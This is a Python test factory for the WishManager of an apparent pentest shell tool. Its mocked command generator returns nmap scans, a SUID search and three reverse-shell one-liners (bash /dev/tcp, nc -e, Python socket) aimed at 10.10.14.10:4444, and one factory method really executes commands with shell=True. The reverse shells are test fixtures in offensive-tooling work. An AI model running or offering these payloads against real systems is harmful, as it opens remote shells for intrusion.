"""Factory for WishManager."""

from pathlib import Path
from unittest.mock import MagicMock, mock_open, patch

import factory
from wish_command_execution import CommandExecutor, CommandStatusTracker
from wish_command_execution.backend import BashBackend
from wish_models import CommandState, UtcDatetime

from wish_sh.test_factories.settings_factory import SettingsFactory
from wish_sh.wish_manager import WishManager


class WishManagerFactory(factory.Factory):
    """Factory for WishManager."""

    class Meta:
        model = WishManager

    # SettingsFactoryを使用
    settings = factory.SubFactory(SettingsFactory)

    @classmethod
    def create(cls, **kwargs):
        """Create a WishManager instance with mocked file operations."""
        # Mock all file system operations
        with patch.object(Path, "mkdir"), \
             patch.object(Path, "exists", return_value=True), \
             patch("builtins.open", new_callable=mock_open), \
             patch("wish_sh.wish_paths.WishPaths.ensure_directories"):

            manager = super().create(**kwargs)

            # Initialize backend for testing
            backend = BashBackend()
            manager.executor = CommandExecutor(backend=backend, log_dir_creator=manager.create_command_log_dirs)
            manager.tracker = CommandStatusTracker(manager.executor, wish_saver=manager.save_wish)

            # Mock file system related methods
            manager.paths.create_command_log_dirs = MagicMock(return_value=Path("/mock/path/to/logs"))

            # Mock generate_commands to return test-specific commands
            def mock_generate_commands(wish_text):
                # For tests, return specific commands based on the wish text
                if "scan" in wish_text.lower() and "port" in wish_text.lower():
                    return [
                        "sudo nmap -p- -oA tcp 10.10.10.40",
                        "sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA udp-fast 10.10.10.40",
                    ]
                elif "find" in wish_text.lower() and "suid" in wish_text.lower():
                    return ["find / -perm -u=s -type f 2>/dev/null"]
                elif "reverse shell" in wish_text.lower() or "revshell" in wish_text.lower():
                    return [
                        "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'",
                        "nc -e /bin/bash 10.10.14.10 4444",
                        "python3 -c 'import socket,subprocess,os;"
                        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                        's.connect(("10.10.14.10",4444));'
                        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                        'subprocess.call(["/bin/sh","-i"]);\'',
                    ]
                else:
                    # Default responses
                    return [
                        f"echo 'Executing wish: {wish_text}'",
                        f"echo 'Processing {wish_text}' && ls -la",
                        "sleep 5"
                    ]

            # Replace the generate_commands method with our mock
            manager.generate_commands = mock_generate_commands

            return manager

    @classmethod
    def create_with_mock_execute(cls, **kwargs):
        """Create a WishManager with mocked execute_command that actually executes commands."""
        manager = cls.create(**kwargs)

        # Make execute_command actually execute the command
        def execute_command_side_effect(wish, command, cmd_num):
            import subprocess
            from pathlib import Path

            # Create a simple log files structure
            log_files = MagicMock()
            log_files.stdout = Path(f"/tmp/stdout_{cmd_num}.log")
            log_files.stderr = Path(f"/tmp/stderr_{cmd_num}.log")

            # Create a command result
            result = MagicMock()
            result.command = command
            result.state = CommandState.DOING
            result.num = cmd_num
            result.log_files = log_files
            result.exit_code = None
            result.finished_at = None

            # Add the result to the wish
            wish.command_results.append(result)

            # Start the process
            process = subprocess.Popen(command, shell=True)

            # Store in running commands dict
            manager.executor.backend.running_commands[cmd_num] = (process, result, wish)

            return result

        manager.execute_command = MagicMock(side_effect=execute_command_side_effect)

        # Make check_running_commands actually check the commands
        def check_running_commands_side_effect():
            for cmd_num, (process, result, _wish) in list(manager.executor.backend.running_commands.items()):
                if process.poll() is not None:  # Process has finished
                    # Update the result
                    result.state = CommandState.SUCCESS if process.returncode == 0 else CommandState.OTHERS
                    result.exit_code = process.returncode
                    result.finished_at = UtcDatetime.now()

                    # Remove from running commands
                    del manager.executor.backend.running_commands[cmd_num]

        manager.check_running_commands = MagicMock(side_effect=check_running_commands_side_effect)

        return manager

    @classmethod
    def create_with_simple_mocks(cls, **kwargs):
        """Create a WishManager with simple mocked methods."""
        from unittest.mock import MagicMock

        manager = cls.create(**kwargs)

        # Mock methods
        manager.execute_command = MagicMock()
        manager.check_running_commands = MagicMock()
        manager.save_wish = MagicMock()
        manager.generate_commands = MagicMock(return_value=["echo 'Test command 1'", "echo 'Test command 2'"])
        manager.cancel_command = MagicMock(return_value="Command 1 cancelled.")

        # Mock command execution components
        manager.executor = MagicMock()
        manager.executor.execute_commands = MagicMock()
        manager.executor.execute_command = MagicMock()
        manager.executor.check_running_commands = MagicMock()
        manager.executor.cancel_command = MagicMock(return_value="Command 1 cancelled.")

        manager.tracker = MagicMock()
        manager.tracker.check_status = MagicMock()
        manager.tracker.is_all_completed = MagicMock(return_value=(False, False))
        manager.tracker.update_wish_state = MagicMock()
        manager.tracker.get_completion_message = MagicMock(return_value="All commands completed.")

        return manager
